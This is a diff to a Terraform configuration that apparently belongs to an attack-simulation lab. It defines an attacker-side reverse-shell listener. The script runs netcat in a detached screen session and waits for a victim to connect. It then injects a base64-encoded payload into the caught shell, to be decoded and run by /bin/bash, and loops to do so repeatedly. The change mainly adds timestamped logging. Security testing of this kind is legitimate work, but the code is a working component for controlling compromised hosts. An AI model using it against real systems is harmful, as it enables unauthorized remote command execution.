@@ -3,24 +3,28 @@ locals {
     listen_ip = var.listen_ip
     base64_command_payload = base64encode(var.payload)
     payload = <<-EOT
-    truncate -s 0 /tmp/attacker_exec_reverseshell_listener.log
-    echo "Starting listener: ${local.listen_ip}:${local.listen_port}" > /tmp/attacker_exec_reverseshell_listener.log
+    LOGFILE=/tmp/attacker_exec_reverseshell_listener.log
+    function log {
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+    }
+    truncate -s 0 $LOGFILE
+    log "listener: ${local.listen_ip}:${local.listen_port}"
     while true; do
         screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
         truncate -s 0 /tmp/netcat.log
         screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
         screen -S netcat -X colon "logfile flush 0^M"
-        echo "Listener started.." >> /tmp/attacker_exec_reverseshell_listener.log 2>&1
-        touch /tmp/attacker_exec_reverseshell_listener
+        log "listener started.."
         until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
-            echo "waiting for connection..." >> /tmp/attacker_exec_reverseshell_listener.log; \
+            log "waiting for connection...";
             sleep 10;
         done
         sleep 30
-        echo 'sending screen command: ${var.payload}' >> /tmp/attacker_exec_reverseshell_listener.log
+        log 'sending screen command: ${var.payload}';
         screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
         sleep 300
-        echo "Restarting attacker session..."
+        log "restarting attacker session..."
     done
     EOT
     base64_payload = base64encode(local.payload)
